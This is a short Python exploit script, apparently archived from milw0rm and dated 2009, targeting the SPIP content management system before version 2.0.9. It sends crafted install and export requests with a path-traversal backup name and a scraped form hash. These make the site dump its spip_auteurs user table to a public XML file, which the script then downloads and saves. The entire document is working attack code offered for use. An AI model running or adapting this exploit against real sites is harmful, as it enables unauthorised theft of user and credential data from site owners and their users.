#!/usr/bin/env python
# SPIP - Content Management System < 2.0.9 exploit
# https://www.securityfocus.com/bid/36008
# Author : Kernel_Panik
#

import urllib, urllib2
import cookielib
import sys

def send_request(urlOpener, url, post_data=None):
   request = urllib2.Request(url)
   url = urlOpener.open(request, post_data)
   return url.read()

def extract_hash(formulaire):
   return formulaire.split("<input name='hash' type='hidden' value='")[1].split("'")[0]


if len(sys.argv) < 3:
   print "SPIP < 2.0.9 exploit by Kernel_Panik\n\tUsage: python script.py <Base_url> <filename>"
   exit()

filename = sys.argv[2]
base_url = sys.argv[1]

cookiejar = cookielib.CookieJar()
urlOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))


formulaire = send_request(urlOpener, base_url+"ecrire/?exec=install&reinstall=non&transformer_xml=export_all&nom_sauvegarde=../../../IMG/"+filename)
print "[+] First request sended..."

formulaire_data = {'action' : 'export_all',
                   'export[]' : 'spip_auteurs',
                   'hash' : extract_hash(formulaire),
                   'arg' : 'start,,../../../IMG/'+filename+'.xml,0,1.3'
                  }
formulaire_data = urllib.urlencode(formulaire_data)


send_request(urlOpener, base_url+"spip.php", formulaire_data)
print "[+] Formulaire content sended"


send_request(urlOpener, base_url+"ecrire/?exec=install&reinstall=non&transformer_xml=export_all&nom_sauvegarde=../../../IMG/"+filename)
print "[+] Second request sended"


send_request(urlOpener, base_url+"ecrire/?exec=install&reinstall=non&transformer_xml=export_all&nom_sauvegarde=../../../IMG/"+filename)
print "[+] Last request sended"

xml_content = send_request(urlOpener, base_url+"IMG/"+filename+".xml")
print "[+] Xml file obtained"


result = open(filename+".xml", "w")
result.write(xml_content)
result.close()
print "[+] File saved "

# milw0rm.com [2009-08-18]